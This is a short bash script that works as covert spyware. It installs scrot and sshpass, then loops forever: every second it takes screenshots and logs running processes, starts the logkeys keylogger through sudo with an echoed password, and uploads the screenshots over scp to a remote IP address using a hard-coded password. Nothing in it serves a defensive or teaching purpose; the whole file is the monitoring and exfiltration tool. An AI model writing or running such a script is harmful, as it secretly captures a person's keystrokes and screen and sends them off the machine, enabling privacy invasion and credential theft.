#!/bin/bash
sudo apt-get update -y
sudo apt-get install scrot -y
sudo apt-get install sshpass -y
cd /tmp
mkdir kl
cd /tmp/kl
mkdir screenshots
mkdir processes
#touch kl.log
#echo password | sudo -S logkeys --start --output /tmp/kl/kl.log
for (( ; ; ))
do
for count in {1..10}
do
scrot -q 100 /tmp/kl/screenshots/`date '+%H-%M-%Y-%m-%d'`.png
ps aux >> /tmp/kl/processes/log-`date '+%H-%M-%Y-%m-%d'`.txt
echo "$count round is done"
sleep 1
done
cd /tmp
#echo password | sudo logkeys --kill
#zip -r -9 logs-`date '+%Y-%m-%d'` /tmp/kl
sudo sshpass -p "PASSWORD" scp -r  /tmp/kl/screenshots roman@208.94.240.6:
cd /tmp/kl
echo password | sudo -S logkeys --start --output /tmp/kl/kl.log
done
